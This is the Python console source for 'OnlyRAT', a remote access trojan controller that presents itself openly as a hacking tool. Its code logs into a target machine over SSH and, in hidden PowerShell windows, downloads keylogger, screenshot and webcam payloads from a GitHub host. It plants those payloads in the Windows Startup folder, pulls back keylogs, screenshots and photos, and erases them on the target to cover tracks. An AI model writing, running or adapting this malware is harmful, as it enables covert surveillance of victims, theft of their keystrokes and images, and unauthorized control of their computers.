#!/usr/bin/python
# python console for OnlyRAT
# created by : C0SM0

# imports
import os
import sys
import getpass
import random as r
from datetime import datetime
from modules import *

# banner for display
banner = """
      ::::::::  ::::    ::: :::     :::   ::: :::::::::      ::: ::::::::::: 
    :+:    :+: :+:+:   :+: :+:     :+:   :+: :+:    :+:   :+: :+:   :+:      
   +:+    +:+ :+:+:+  +:+ +:+      +:+ +:+  +:+    +:+  +:+   +:+  +:+       
  +#+    +:+ +#+ +:+ +#+ +#+       +#++:   +#++:++#:  +#++:++#++: +#+        
 +#+    +#+ +#+  +#+#+# +#+        +#+    +#+    +#+ +#+     +#+ +#+         
#+#    #+# #+#   #+#+# #+#        #+#    #+#    #+# #+#     #+# #+#          
########  ###    #### ########## ###    ###    ### ###     ### ###  

            [::] The Only RAT You'll Ever Need [::]
                [::] Created By : Blue Cosmo [::]
"""

# help menu
help_menu = """
        [+] Arguments:
            <username>.rat = configuration file 

        [+] Example:
            onlyrat bluecosmo.rat
"""

# option menu
options_menu = """
        [+] Payloads:
            [0] - Remote Console
            [1] - Install Keylogger
            [2] - Grab Keylogs
            [3] - Install ScreenCapture
            [4] - Grab ScreenShots 
            [5] - Upload File 
            [6] - Download File
            [7] - Restart Target PC
            [8] - Install WebCam Capture
            [9] - Grab WebCam Pictures [BROKEN]

        [+] Options:
            [h] or [help] ----- Help Menu
            [c] or [config] --- Display RAT File
            [v] or [version] -- Version Number
            [u] or [update] --- Update OnlyRAT
            [r] or [remove] --- Remove OnlyRAT
            [q] or [quit] ----- Quit

            * any other commands will be 
              sent through your terminal

        [*] Select an [option]...

"""

username = getpass.getuser() # gets username
header = f"[~] {username}@onlyrat $ " # sets up user input interface
remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main" # url path for OnlyRAT files
local_path = f"/home/{username}/.OnlyRAT" if username != "root" else "/root/.OnlyRAT" # gets path of OnlyRAT

# random text generator for obfuscation
def random_text():
    lower_case = "abcdefghijklmnopqrstuvwxyz"
    upper_case = "abcdefghijklmnopqrstuvwxyz".upper()

    characters = lower_case + upper_case
    generated_text = ""

    for i in range(10):
        generated_text += r.choice(list(characters))

    return generated_text

# read config file
def read_config(config_file):
    configuration = {}

    # get file contents
    read_lines = open(config_file, "r").readlines()

    # get target configurations
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
    configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()

    return configuration

# display configuration file data
def print_config(configuration):

    for key, value in configuration.items():
        print(f"{key} : {value}")

# clear screen
def clear():
    os.system("clear")

# terminates program
def exit():
    print("\n[*] Exiting...")
    sys.exit()

# gets current date and time
def current_date():
    current = datetime.now()

    return current.strftime("%m-%d-%Y_%H-%M-%S")

# connects rat to target
def connect(address, password):
    print("\n [*] Connecting to target...")

    # remotely connect
    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address}")

# remote uploads with SCP
def remote_upload(address, password, upload, path):

    print("\n[*] Starting Upload...")

    # scp upload
    os.system(f"sshpass -p \"{password}\" scp {upload} onlyrat@{address}:{path}")

    print("[+] Upload complete\n")


# remote download with SCP
def remote_download(address, password, path):

    print("\n[*] Starting Download...")

    # scp download
    os.system("mkdir ~/Downloads")
    os.system(f"sshpass -p \"{password}\" scp -r onlyrat@{address}:{path} ~/Downloads")

    print("[+] Download saved to \"~/Downloads\"\n")

# run commands remotely with SCP
def remote_command(address, password, command):
    # remote command execution 
    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} '{command}'")

# keylogger
def keylogger(address, password, username, working):

    print("\n[*] Prepping keylogger...")
    # web requests
    keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/KHRgMHYmdT.ps1 >> GiLqXiexKP.cmd"
    print("[+] Keylogger prepped")

    # installing keylogger
    print("[*] Installing keylogger...")
    remote_command(address, password, keylogger_command)
    print("[*] Installing controller...")
    remote_command(address, password, controller_command)
    print("[+] Keylogger installed sucessfully\n")

    # execute logger
    print("\n[!] Restart target computer to execute")

# takes screenshots off of target
def grab_screenshots(address, password, working, username):
    # download screenshot
    print("\n[*] Downloading screenshots...")
    screenshot_location = f"{working}/amETlOMhPo"
    remote_download(address, password, screenshot_location)
    print("[+] Screenshots downloaded")

    # formatting screenshots
    print("[*] Fromatting screenshots...")
    loot_folder = f"screenshots-{username}-{current_date()}"
    os.system(f"mkdir ~/Downloads/{loot_folder}")
    os.system(f"mv ~/Downloads/amETlOMhPo/* ~/Downloads/{loot_folder}")
    os.system(f"rm -rf ~/Downloads/amETlOMhPo")
    print("[+] Screenshots formatted")

    # deletes screenshots off of target
    print("[*] Covering tracks...")
    delete_screenshots = f"powershell Remove-Item {working}/amETlOMhPo/*"
    remote_command(address, password, delete_screenshots)
    print("[+] Screenshots downloaded")

    # confirmation
    print("\n[+] Screenshots downloaded to \"~/Downloads\"\n")

# takes webcam pictures off of target
def grab_webcam(address, password, working, username):
    # download webcam photos
    print("\n[*] Downloading webcam photos...")
    screenshot_location = f"{working}/bNOEXCxyVp"
    remote_download(address, password, screenshot_location)
    print("[+] Photos downloaded")

    # formatting webcam photos
    print("[*] Fromatting photos...")
    loot_folder = f"webcam-{username}-{current_date()}"
    os.system(f"mkdir ~/Downloads/{loot_folder}")
    os.system(f"mv ~/Downloads/bNOEXCxyVp/* ~/Downloads/{loot_folder}")
    os.system(f"rm -rf ~/Downloads/bNOEXCxyVp")
    print("[+] Photos formatted")

    # deletes photos off of target
    print("[*] Covering tracks...")
    delete_screenshots = f"powershell Remove-Item {working}/bNOEXCxyVp/*"
    remote_command(address, password, delete_screenshots)
    print("[+] Photos downloaded")

    # confirmation
    print("\n[+] Photos downloaded to \"~/Downloads\"\n")


# custom upload
def upload(address, password, working):

    # get upload file
    print("\n[~] Enter file you wish to upload :")
    upload_file = input(header)

    # upload file
    print("\n[*] Uploading...")
    remote_upload(address, password, upload_file, working)
    print(f"[+] Uploaded sucessfully to \"{working}\"\n")

# custom download
def download(address, password):

    # get download path
    print("\n[~] Enter path of file you wish to download :")
    download_file = input(header)

    # download file
    print("\n[*] Downloading...")
    remote_download(address, password, download_file)

# update OnlyRAT
def update():

    print("\n[*] Checking for updates...")

    # get latest version nubmer
    os.system(f"curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")

    # save version nubmers to memory
    current_version = float(open(f"{local_path}/version.txt", "r").read())
    latest_version = float(open(f"{local_path}/latest.txt", "r").read())

    # remove version number file
    os.system("rm -rf ~/.OnlyRAT/latest.txt")

    # if new version is available, update
    if latest_version > current_version:
        print("\n[+] Update found")
        print("[*] Update Onlyrat? [y/n]\n")

        # user input, option
        option = input(f"{header}")
        
        # update
        if option == "y":
            os.system(f"sh ~/.OnlyRAT/payloads/update.sh")

        # exception
        else:
            main()

    # otherwise, run main code
    else:
        print("\n[+] OnlyRAT already up to date")
        print("[*] Hit any key to continue...\n")
        input(header)
        main()

# uninstalls onlyrat
def remove():
    # confirmation
    print("\n [!] Are you sure you want to remove OnlyRAT [y/n]\n")

    # user input
    option = input(header)

    # delete OnlyRAT
    if option == "y":
        os.system("rm -rf ~/.OnlyRAT")

    # cancel
    if option == "n":
        main()

# command line interface
def cli(arguments):
    # display banner
    clear()
    print(banner)

    # if arguments exist
    if arguments:

        # display options
        print(options_menu)

        # loop user input
        while True:

            # user input, option
            option = input(header)

            # check if configuration file exists
            try:
                configuration = read_config(sys.argv[1])
        
            except FileNotFoundError: 
                print("\n[!!] File does not exist")
                exit()

            # get config info
            ipv4 = configuration.get("IPADDRESS")
            password = configuration.get("PASSWORD")
            working_direcory = configuration.get("WORKINGDIRECTORY")
            startup_direcory = configuration.get("STARTUPDIRECTORY")
            target_username = working_direcory[9:-19]

            # remote console
            if option == "0":
                connect(ipv4, password)

            # keylogger option
            elif option == "1":
                keylogger(ipv4, password, target_username, working_direcory)
            
            # grab keylogs option
            elif option == "2":
                remote_download(ipv4, password, f"{working_direcory}/{target_username}.log")
                remote_command(ipv4, password, f"powershell New-Item -Path {working_direcory}/{target_username}.log -ItemType File -Force")

                print("[+] Log file saved to \"~/Downloads\"")
                print("[+] Log file on target has been wiped\n")

            # installs screen capture option
            elif option == "3":
                print("\n[*] Installing screen capture...")
                install_screencaputre = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/screenshot.ps1 -OutFile {working_direcory}/SbQRViPjIq.ps1\""
                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SbQRViPjIq.ps1 >> GiLqXiexKP.cmd"

                remote_command(ipv4, password, install_screencaputre)
                remote_command(ipv4, password, add_to_startup)

                print("[+] ScreenCapture installed\n")
                print("\n[!] Restart target computer to execute\n")

            # take screenshot option
            elif option == "4":
                grab_screenshots(ipv4, password, working_direcory, target_username)

            # custom upload
            elif option == "5":
                upload(ipv4, password, working_direcory)

            # custom download
            elif option == "6":
                download(ipv4, password)

            # restart target option
            elif option == "7":
                remote_command(ipv4, password, "shutdown /r")

            # install webcam option
            elif option == "8":
                print("\n[*] Installing webcam capture...")

                install_webcam = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcam.ps1 -OutFile {working_direcory}/bNOEXCxyVp/LIspiXrVAu.ps1\""
                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell cd $env:temp/bNOEXCxyVp; Start-Process powershell.exe -windowstyle hidden $env:temp/bNOEXCxyVp/LIspiXrVAu.ps1 >> GiLqXiexKP.cmd"

                remote_command(ipv4, password, install_webcam)
                remote_command(ipv4, password, add_to_startup)

                print("[+] Webcam capture installed\n")
                print("\n[!] Restart target computer to execute\n")
            
            # grab keylogs
            elif option == "9":
                grab_webcam(ipv4, password, working_direcory, target_username)

            # help menu
            elif option == "h" or option == "help":
                main()

            # display config file info
            elif option == "c" or option == "config":
                print_config(configuration)
                print(f"USERNAME : {target_username}")
            
            # get version number
            elif option == "v" or option == "version":
                os.system(f"cat {local_path}/version.txt")

            # update option
            elif option == "u" or option == "update":
                update()
                exit()

            # remove installation
            elif option == "r" or option == "remove" or option == "uninstall":
                remove()

            # quit option
            elif option == "q" or option == "quit" or option == "exit":
                exit()

            # exception
            else:
                os.system(option)
            
            # new line for cleaner UI
            print("\n")

    # if arguments don't exist
    else:
        print(help_menu)

# main code
def main():
    
    # clear screen
    clear()

    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    # run command line interface
    cli(arguments_exist)

# runs main code
if __name__ == "__main__":
    # runs main function
    main()